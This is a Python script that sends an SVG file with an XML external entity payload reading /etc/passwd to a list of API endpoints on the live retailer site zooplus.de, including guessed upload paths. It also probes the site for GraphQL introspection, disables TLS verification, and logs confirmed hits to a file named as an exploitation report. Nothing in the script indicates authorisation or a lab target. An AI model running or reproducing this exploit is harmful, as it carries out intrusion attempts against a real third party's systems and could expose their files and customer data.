#!/usr/bin/env python3
"""Comprehensive endpoint analysis - test all found endpoints"""
import requests
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

# All endpoints found through browser and analysis
all_endpoints = [
    # Cart API
    "/checkout/api/cart-api/v2/cart",
    "/checkout/api/cart-api/v1/cart",
    # State API
    "/semiprotected/api/checkout/state-api/v2/get",
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    # Audiences API
    "/semiprotected/api/audiences-api/v1/me",
    "/semiprotected/api/audiences-api/v1/sites/1/audiences",
    # Events API
    "/zootopia-events/api/events/sites/1",
    "/zootopia-events/api/settings/sites/zooplus.de/gdpr",
    # Personalization
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/leto-personalization/api/v1/pet-type/site/1",
    # Customer config
    "/myaccount/api/customer-config/v1/customerconfiguration",
    # Order details
    "/myaccount/api/order-details/v3/customer/lastOrders",
    "/myaccount/api/order-details/v3/feature-flags",
    # Shop API
    "/checkout/api/shop-api/v1/sid",
    "/checkout/api/state-api/cart-version",
    # Product catalog
    "/hopps-product-catalog/api/v1/sites/1/de-DE/products",
    # Recommender
    "/zootopia-recommender/api/v4/sites/1/de/pages/web_home/recommendations",
    # Newsletter
    "/newsletter/api/v1/private/newsletter/box-predefined-values",
]

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []
upload_endpoints_found = []

print("[*] Comprehensive endpoint analysis...\n")

# Test each endpoint for upload capability
for ep in all_endpoints:
    # Try POST with file
    svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
    
    try:
        files = {'file': ('x.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=2, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text:
                print(f"  [CRITICAL] SVG XXE: {ep}")
                found_vulns.append({"type": "svg_xxe_lfi", "severity": "CRITICAL", "endpoint": ep})
            else:
                upload_endpoints_found.append(ep)
    except: pass
    
    # Try variations with /upload suffix
    variations = [
        f"{ep}/upload",
        f"{ep}/file",
        f"{ep}/attachment",
    ]
    for var in variations:
        try:
            files = {'file': ('x.svg', svg_xxe, 'image/svg+xml')}
            resp = s.post(f"{base}{var}", files=files, timeout=2, verify=False)
            if resp.status_code in [200, 201, 302]:
                if "root:" in resp.text:
                    print(f"  [CRITICAL] SVG XXE: {var}")
                    found_vulns.append({"type": "svg_xxe_lfi", "severity": "CRITICAL", "endpoint": var})
                else:
                    upload_endpoints_found.append(var)
        except: pass

# Test for GraphQL
print("\n[*] Testing GraphQL endpoints...")
graphql_endpoints = [
    "/graphql",
    "/api/graphql",
    "/checkout/api/graphql",
    "/myaccount/api/graphql",
]

for ep in graphql_endpoints:
    try:
        resp = s.post(f"{base}{ep}", json={"query": "{__schema{types{name}}}"}, timeout=3, verify=False)
        if resp.status_code == 200:
            if '__schema' in resp.text:
                print(f"  [CRITICAL] GraphQL Introspection: {ep}")
                found_vulns.append({"type": "graphql_introspection", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}: {v['endpoint']}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated")
else:
    print("  No critical vulnerabilities found")
    if upload_endpoints_found:
        print(f"\n  Found {len(upload_endpoints_found)} endpoints that accept uploads:")
        for ep in upload_endpoints_found[:5]:
            print(f"    {ep}")

print("=" * 70)

